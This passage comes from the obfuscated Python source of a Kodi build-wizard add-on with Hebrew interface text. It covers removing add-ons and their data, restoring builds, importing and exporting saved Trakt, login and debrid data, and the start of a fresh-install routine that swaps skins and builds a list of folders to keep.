		OO0OO00OOOOO0OO0O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O0000000OOOOOO0OO ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,OO00OO0OO000OO00O ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4657
	if OO0OO00OOOOO0OO0O ==1 :#line:4658
		OOO000O00000000O0 =os .path .join (ADDONS ,OO00OO0OO000OO00O )#line:4659
		wiz .log ("Removing Addon %s"%OO00OO0OO000OO00O )#line:4660
		wiz .cleanHouse (OOO000O00000000O0 )#line:4661
		xbmc .sleep (1000 )#line:4662
		try :shutil .rmtree (OOO000O00000000O0 )#line:4663
		except Exception as O0OOO0OO0O0OO000O :wiz .log ("Error removing %s"%OO00OO0OO000OO00O ,xbmc .LOGNOTICE )#line:4664
		removeAddonData (OO00OO0OO000OO00O ,O0000000OOOOOO0OO ,over )#line:4665
	if over ==False :#line:4666
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,O0000000OOOOOO0OO ))#line:4667
def removeAddonData (OO000000OOOO0O0O0 ,name =None ,over =False ):#line:4669
	if OO000000OOOO0O0O0 =='all':#line:4670
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4671
			wiz .cleanHouse (ADDOND )#line:4672
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4673
	elif OO000000OOOO0O0O0 =='uninstalled':#line:4674
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4675
			O000O0OO00OOOO0O0 =0 #line:4676
			for OO0O0OOOO0O0000O0 in glob .glob (os .path .join (ADDOND ,'*')):#line:4677
				O0O0O0OO0OOO0O0OO =OO0O0OOOO0O0000O0 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4678
				if O0O0O0OO0OOO0O0OO in EXCLUDES :pass #line:4679
				elif os .path .exists (os .path .join (ADDONS ,O0O0O0OO0OOO0O0OO )):pass #line:4680
				else :wiz .cleanHouse (OO0O0OOOO0O0000O0 );O000O0OO00OOOO0O0 +=1 ;wiz .log (OO0O0OOOO0O0000O0 );shutil .rmtree (OO0O0OOOO0O0000O0 )#line:4681
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O000O0OO00OOOO0O0 ))#line:4682
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4683
	elif OO000000OOOO0O0O0 =='empty':#line:4684
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4685
			O000O0OO00OOOO0O0 =wiz .emptyfolder (ADDOND )#line:4686
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O000O0OO00OOOO0O0 ))#line:4687
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4688
	else :#line:4689
		O0O00O0OOO0OO0OO0 =os .path .join (USERDATA ,'addon_data',OO000000OOOO0O0O0 )#line:4690
		if OO000000OOOO0O0O0 in EXCLUDES :#line:4691
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4692
		elif os .path .exists (O0O00O0OOO0OO0OO0 ):#line:4693
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO000000OOOO0O0O0 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4694
				wiz .cleanHouse (O0O00O0OOO0OO0OO0 )#line:4695
				try :#line:4696
					shutil .rmtree (O0O00O0OOO0OO0OO0 )#line:4697
				except :#line:4698
					wiz .log ("Error deleting: %s"%O0O00O0OOO0OO0OO0 )#line:4699
			else :#line:4700
				wiz .log ('Addon data for %s was not removed'%OO000000OOOO0O0O0 )#line:4701
	wiz .refresh ()#line:4702
def restoreit (OO0O0O0000O0OOO00 ):#line:4704
	if OO0O0O0000O0OOO00 =='build':#line:4705
		OO0OO0O00OO00OOO0 =freshStart ('restore')#line:4706
		if OO0OO0O00OO00OOO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4707
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4708
		wiz .skinToDefault ()#line:4709
	wiz .restoreLocal (OO0O0O0000O0OOO00 )#line:4710
def restoreextit (O0O00O000O0O0O0OO ):#line:4712
	if O0O00O000O0O0O0OO =='build':#line:4713
		OOOO0O0OO0O0O000O =freshStart ('restore')#line:4714
		if OOOO0O0OO0O0O000O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4715
	wiz .restoreExternal (O0O00O000O0O0O0OO )#line:4716
def buildInfo (OO0OOOO0000OO0000 ):#line:4718
	if wiz .workingURL (SPEEDFILE )==True :#line:4719
		if wiz .checkBuild (OO0OOOO0000OO0000 ,'url'):#line:4720
			OO0OOOO0000OO0000 ,O0OOOOOO0OO00OO00 ,O00OO0OOOO00OOOO0 ,OO0O0O000000O000O ,O0OOO00OO00OO0O00 ,OOOO0O00000OOOOO0 ,O00O0O00OOO000OO0 ,OO00O0O0O0OO00O0O ,O00OOO00O0OO0OOO0 ,OO000OO0O0OO0O00O ,OOO00O0OOO0O0OO00 =wiz .checkBuild (OO0OOOO0000OO0000 ,'all')#line:4721
			OO000OO0O0OO0O00O ='Yes'if OO000OO0O0OO0O00O .lower ()=='yes'else 'No'#line:4722
			O00000O00O0OOO00O ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO0OOOO0000OO0000 )#line:4723
			O00000O00O0OOO00O +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0OOOOOO0OO00OO00 )#line:4724
			if not OOOO0O00000OOOOO0 =="http://":#line:4725
				OOOOOOO0OOOOOOOO0 =wiz .themeCount (OO0OOOO0000OO0000 ,False )#line:4726
				O00000O00O0OOO00O +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (OOOOOOO0OOOOOOOO0 ))#line:4727
			O00000O00O0OOO00O +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0OOO00OO00OO0O00 )#line:4728
			O00000O00O0OOO00O +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO000OO0O0OO0O00O )#line:4729
			O00000O00O0OOO00O +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOO00O0OOO0O0OO00 )#line:4730
			wiz .TextBox (ADDONTITLE ,O00000O00O0OOO00O )#line:4731
		else :wiz .log ("Invalid Build Name!")#line:4732
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4733
def buildVideo (OOOO0OO0OO0O00O0O ):#line:4735
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4736
	if wiz .workingURL (SPEEDFILE )==True :#line:4737
		OOOOO000OOO0O00OO =wiz .checkBuild (OOOO0OO0OO0O00O0O ,'preview')#line:4738
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%OOOO0OO0OO0O00O0O )#line:4739
		if OOOOO000OOO0O00OO and not OOOOO000OOO0O00OO =='http://':playVideo (OOOOO000OOO0O00OO )#line:4740
		else :wiz .log ("[%s]Unable to find url for video preview"%OOOO0OO0OO0O00O0O )#line:4741
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4742
def dependsList (O000OOOO0OOOOOOO0 ):#line:4744
	OOO000000O0O000O0 =os .path .join (ADDONS ,O000OOOO0OOOOOOO0 ,'addon.xml')#line:4745
	if os .path .exists (OOO000000O0O000O0 ):#line:4746
		OO00OOOO0OO0000O0 =open (OOO000000O0O000O0 ,mode ='r');O0000OO0OO0O0O0OO =OO00OOOO0OO0000O0 .read ();OO00OOOO0OO0000O0 .close ();#line:4747
		OOOO0OO0OO0OOOOOO =wiz .parseDOM (O0000OO0OO0O0O0OO ,'import',ret ='addon')#line:4748
		O0OOO0O0000OO0OOO =[]#line:4749
		for OOO000OOOO0O00OO0 in OOOO0OO0OO0OOOOOO :#line:4750
			if not 'xbmc.python'in OOO000OOOO0O00OO0 :#line:4751
				O0OOO0O0000OO0OOO .append (OOO000OOOO0O00OO0 )#line:4752
		return O0OOO0O0000OO0OOO #line:4753
	return []#line:4754
def manageSaveData (OO0O0O00O0OOOOOO0 ):#line:4756
	if OO0O0O00O0OOOOOO0 =='import':#line:4757
		O0OO0O0OO0O0O00OO =os .path .join (ADDONDATA ,'temp')#line:4758
		if not os .path .exists (O0OO0O0OO0O0O00OO ):os .makedirs (O0OO0O0OO0O0O00OO )#line:4759
		O00OOO0OO0OO0OO0O =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4760
		if not O00OOO0OO0OO0OO0O .endswith ('.zip'):#line:4761
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4762
			return #line:4763
		O0O00000000OO00O0 =os .path .join (MYBUILDS ,'SaveData.zip')#line:4764
		OO0000O0OOOOOO0O0 =xbmcvfs .copy (O00OOO0OO0OO0OO0O ,O0O00000000OO00O0 )#line:4765
		wiz .log ("%s"%str (OO0000O0OOOOOO0O0 ))#line:4766
		extract .all (xbmc .translatePath (O0O00000000OO00O0 ),O0OO0O0OO0O0O00OO )#line:4767
		O0000000O0OO000OO =os .path .join (O0OO0O0OO0O0O00OO ,'trakt')#line:4768
		OO0O0O0OOO000OO0O =os .path .join (O0OO0O0OO0O0O00OO ,'login')#line:4769
		O0O0O000000O0OOOO =os .path .join (O0OO0O0OO0O0O00OO ,'debrid')#line:4770
		O0000O00OOOOOO000 =0 #line:4771
		if os .path .exists (O0000000O0OO000OO ):#line:4772
			O0000O00OOOOOO000 +=1 #line:4773
			OOOOOO0OOOO0OO0OO =os .listdir (O0000000O0OO000OO )#line:4774
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4775
			for O0OOO0OO000O0OO00 in OOOOOO0OOOO0OO0OO :#line:4776
				OOO00O0O0OO0O000O =os .path .join (traktit .TRAKTFOLD ,O0OOO0OO000O0OO00 )#line:4777
				OOO0OOOOO00OO0OO0 =os .path .join (O0000000O0OO000OO ,O0OOO0OO000O0OO00 )#line:4778
				if os .path .exists (OOO00O0O0OO0O000O ):#line:4779
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O0OOO0OO000O0OO00 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4780
					else :os .remove (OOO00O0O0OO0O000O )#line:4781
				shutil .copy (OOO0OOOOO00OO0OO0 ,OOO00O0O0OO0O000O )#line:4782
			traktit .importlist ('all')#line:4783
			traktit .traktIt ('restore','all')#line:4784
		if os .path .exists (OO0O0O0OOO000OO0O ):#line:4785
			O0000O00OOOOOO000 +=1 #line:4786
			OOOOOO0OOOO0OO0OO =os .listdir (OO0O0O0OOO000OO0O )#line:4787
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4788
			for O0OOO0OO000O0OO00 in OOOOOO0OOOO0OO0OO :#line:4789
				OOO00O0O0OO0O000O =os .path .join (loginit .LOGINFOLD ,O0OOO0OO000O0OO00 )#line:4790
				OOO0OOOOO00OO0OO0 =os .path .join (OO0O0O0OOO000OO0O ,O0OOO0OO000O0OO00 )#line:4791
				if os .path .exists (OOO00O0O0OO0O000O ):#line:4792
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O0OOO0OO000O0OO00 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4793
					else :os .remove (OOO00O0O0OO0O000O )#line:4794
				shutil .copy (OOO0OOOOO00OO0OO0 ,OOO00O0O0OO0O000O )#line:4795
			loginit .importlist ('all')#line:4796
			loginit .loginIt ('restore','all')#line:4797
		if os .path .exists (O0O0O000000O0OOOO ):#line:4798
			O0000O00OOOOOO000 +=1 #line:4799
			OOOOOO0OOOO0OO0OO =os .listdir (O0O0O000000O0OOOO )#line:4800
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4801
			for O0OOO0OO000O0OO00 in OOOOOO0OOOO0OO0OO :#line:4802
				OOO00O0O0OO0O000O =os .path .join (debridit .REALFOLD ,O0OOO0OO000O0OO00 )#line:4803
				OOO0OOOOO00OO0OO0 =os .path .join (O0O0O000000O0OOOO ,O0OOO0OO000O0OO00 )#line:4804
				if os .path .exists (OOO00O0O0OO0O000O ):#line:4805
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O0OOO0OO000O0OO00 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4806
					else :os .remove (OOO00O0O0OO0O000O )#line:4807
				shutil .copy (OOO0OOOOO00OO0OO0 ,OOO00O0O0OO0O000O )#line:4808
			debridit .importlist ('all')#line:4809
			debridit .debridIt ('restore','all')#line:4810
		wiz .cleanHouse (O0OO0O0OO0O0O00OO )#line:4811
		wiz .removeFolder (O0OO0O0OO0O0O00OO )#line:4812
		os .remove (O0O00000000OO00O0 )#line:4813
		if O0000O00OOOOOO000 ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4814
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4815
	elif OO0O0O00O0OOOOOO0 =='export':#line:4816
		OO0O0OOO0O0OOO0O0 =xbmc .translatePath (MYBUILDS )#line:4817
		OO0O00O00O0O0O0OO =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4818
		traktit .traktIt ('update','all')#line:4819
		loginit .loginIt ('update','all')#line:4820
		debridit .debridIt ('update','all')#line:4821
		O00OOO0OO0OO0OO0O =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4822
		O00OOO0OO0OO0OO0O =xbmc .translatePath (O00OOO0OO0OO0OO0O )#line:4823
		OOO0OO0OOOOO000O0 =os .path .join (OO0O0OOO0O0OOO0O0 ,'SaveData.zip')#line:4824
		OOO0O0OO0O0O0OO0O =zipfile .ZipFile (OOO0OO0OOOOO000O0 ,mode ='w')#line:4825
		for O0O0O000OO00OO0O0 in OO0O00O00O0O0O0OO :#line:4826
			if os .path .exists (O0O0O000OO00OO0O0 ):#line:4827
				OOOOOO0OOOO0OO0OO =os .listdir (O0O0O000OO00OO0O0 )#line:4828
				for O0OOO0000O0OOO000 in OOOOOO0OOOO0OO0OO :#line:4829
					OOO0O0OO0O0O0OO0O .write (os .path .join (O0O0O000OO00OO0O0 ,O0OOO0000O0OOO000 ),os .path .join (O0O0O000OO00OO0O0 ,O0OOO0000O0OOO000 ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4830
		OOO0O0OO0O0O0OO0O .close ()#line:4831
		if O00OOO0OO0OO0OO0O ==OO0O0OOO0O0OOO0O0 :#line:4832
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0OO0OOOOO000O0 ))#line:4833
		else :#line:4834
			try :#line:4835
				xbmcvfs .copy (OOO0OO0OOOOO000O0 ,os .path .join (O00OOO0OO0OO0OO0O ,'SaveData.zip'))#line:4836
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (O00OOO0OO0OO0OO0O ,'SaveData.zip')))#line:4837
			except :#line:4838
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0OO0OOOOO000O0 ))#line:4839
def freshStart (install =None ,over =False ):#line:4844
	if USERNAME =='':#line:4845
		ADDON .openSettings ()#line:4846
		sys .exit ()#line:4847
	OO0O000O00O0OO0OO =(SPEEDFILE )#line:4848
	(OO0O000O00O0OO0OO )#line:4849
	O000OO0O0O0O0O00O =(wiz .workingURL (OO0O000O00O0OO0OO ))#line:4850
	(O000OO0O0O0O0O00O )#line:4851
	if KEEPTRAKT =='true':#line:4852
		traktit .autoUpdate ('all')#line:4853
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4854
	if KEEPREAL =='true':#line:4855
		debridit .autoUpdate ('all')#line:4856
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4857
	if KEEPLOGIN =='true':#line:4858
		loginit .autoUpdate ('all')#line:4859
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4860
	if over ==True :OOOO0O0000O0OOO00 =1 #line:4861
	elif install =='restore':OOOO0O0000O0OOO00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4862
	elif install :OOOO0O0000O0OOO00 =1 #line:4863
	else :OOOO0O0000O0OOO00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4864
	if OOOO0O0000O0OOO00 :#line:4865
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4866
			O000OOO000000O0O0 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4867
			skinSwitch .swapSkins (O000OOO000000O0O0 )#line:4870
			O000O00OO000OO00O =0 #line:4871
			xbmc .sleep (1000 )#line:4872
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O000O00OO000OO00O <150 :#line:4873
				O000O00OO000OO00O +=1 #line:4874
				xbmc .sleep (1000 )#line:4875
				wiz .ebi ('SendAction(Select)')#line:4876
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4877
				wiz .ebi ('SendClick(11)')#line:4878
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4879
			xbmc .sleep (1000 )#line:4880
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4881
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4882
			return #line:4883
		wiz .addonUpdates ('set')#line:4884
		O000000O0O0O0OOO0 =os .path .abspath (HOME )#line:4885
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4886
		OOO0OO0OOOO0O0O0O =sum ([len (O0O0OO000OO0O0O00 )for OO00000O000O0OOOO ,OO0OOO000OOOO0OO0 ,O0O0OO000OO0O0O00 in os .walk (O000000O0O0O0OOO0 )]);OOO0O0OOO0000OOOO =0 #line:4887
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4888
		EXCLUDES .append ('My_Builds')#line:4889
		EXCLUDES .append ('archive_cache')#line:4890
		EXCLUDES .append ('script.module.requests')#line:4891
		EXCLUDES .append ('myfav.anon')#line:4892
		if KEEPREPOS =='true':#line:4893
			O0000O0O0000000O0 =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4894
			for OOOO0O000O0O00OO0 in O0000O0O0000000O0 :#line:4895
				O0O0O00OOOOO00OO0 =os .path .split (OOOO0O000O0O00OO0 [:-1 ])[1 ]#line:4896
				if not O0O0O00OOOOO00OO0 ==EXCLUDES :#line:4897
					EXCLUDES .append (O0O0O00OOOOO00OO0 )#line:4898
		if KEEPSUPER =='true':#line:4899
			EXCLUDES .append ('plugin.program.super.favourites')#line:4900
		if KEEPMOVIELIST =='true':#line:4901
			EXCLUDES .append ('plugin.video.metalliq')#line:4902
		if KEEPMOVIELIST =='true':#line:4903
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4904
		if KEEPADDONS =='true':#line:4905
			EXCLUDES .append ('addons')#line:4906
		if KEEPTELEMEDIA =='true':#line:4907
			EXCLUDES .append ('plugin.video.telemedia')#line:4908
		EXCLUDES .append ('plugin.video.elementum')#line:4913
		EXCLUDES .append ('script.elementum.burst')#line:4914
		EXCLUDES .append ('script.elementum.burst-master')#line:4915
		EXCLUDES .append ('plugin.video.quasar')#line:4916
		EXCLUDES .append ('script.quasar.burst')#line:4917
		EXCLUDES .append ('skin.estuary')#line:4918
		if KEEPWHITELIST =='true':#line:4921
			OOO000OO0O00O0000 =''#line:4922
			OO000OO0OOOOOO00O =wiz .whiteList ('read')#line:4923
			if len (OO000OO0OOOOOO00O )>0 :#line:4924
				for OOOO0O000O0O00OO0 in OO000OO0OOOOOO00O :#line:4925
					try :OOO0OOO00000O0OO0 ,O0OOO00O0O0OOO000 ,OO0OO0000O0O0OOO0 =OOOO0O000O0O00OO0 #line:4926
					except :pass #line:4927
					if OO0OO0000O0O0OOO0 .startswith ('pvr'):OOO000OO0O00O0000 =O0OOO00O0O0OOO000 #line:4928
					OO0O0OO0O00OOOO00 =dependsList (OO0OO0000O0O0OOO0 )#line:4929
					for OOOO00O000OO00OO0 in OO0O0OO0O00OOOO00 :#line:4930
						if not OOOO00O000OO00OO0 in EXCLUDES :#line:4931
							EXCLUDES .append (OOOO00O000OO00OO0 )#line:4932
						OO000O0O0000000OO =dependsList (OOOO00O000OO00OO0 )#line:4933
						for OOO0O0000OO0O00O0 in OO000O0O0000000OO :#line:4934
							if not OOO0O0000OO0O00O0 in EXCLUDES :#line:4935
								EXCLUDES .append (OOO0O0000OO0O00O0 )#line:4936
					if not OO0OO0000O0O0OOO0 in EXCLUDES :#line:4937
						EXCLUDES .append (OO0OO0000O0O0OOO0 )#line:4938
				if not OOO000OO0O00O0000 =='':wiz .setS ('pvrclient',OO0OO0000O0O0OOO0 )#line:4939
		if wiz .getS ('pvrclient')=='':#line:4940
			for OOOO0O000O0O00OO0 in EXCLUDES :#line:4941
				if OOOO0O000O0O00OO0 .startswith ('pvr'):#line:4942
					wiz .setS ('pvrclient',OOOO0O000O0O00OO0 )#line:4943
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4944
		O0OO00OOOOO00OOO0 =wiz .latestDB ('Addons')#line:4945
		for O0O00O0OOO0O0OOOO ,O0000O000O00O0000 ,OOO0O000O000OOO0O in os .walk (O000000O0O0O0OOO0 ,topdown =True ):#line:4946
			O0000O000O00O0000 [:]=[O0OOO000000O0OO00 for O0OOO000000O0OO00 in O0000O000O00O0000 if O0OOO000000O0OO00 not in EXCLUDES ]#line:4947
			for OOO0OOO00000O0OO0 in OOO0O000O000OOO0O :#line:4948
				OOO0O0OOO0000OOOO +=1 #line:4949
				OO0OO0000O0O0OOO0 =O0O00O0OOO0O0OOOO .replace ('/','\\').split ('\\')#line:4950
				O000O00OO000OO00O =len (OO0OO0000O0O0OOO0 )-1 #line:4952
				if OO0OO0000O0O0OOO0 [O000O00OO000OO00O -2 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0000O0O0OOO0 [O000O00OO000OO00O ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4953
				elif OOO0OOO00000O0OO0 =='MyVideos99.db'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4954
				elif OOO0OOO00000O0OO0 =='MyVideos107.db'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4955
				elif OOO0OOO00000O0OO0 =='MyVideos116.db'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4956
				elif OOO0OOO00000O0OO0 =='MyVideos99.db'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4957
				elif OOO0OOO00000O0OO0 =='MyVideos107.db'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4958
				elif OOO0OOO00000O0OO0 =='MyVideos116.db'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -1 ]=='userdata'and OO0OO0000O0O0OOO0 [O000O00OO000OO00O -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0O00O0OOO0O0OOOO ,OOO0OOO00000O0OO0 ),xbmc .LOGNOTICE )#line:4959
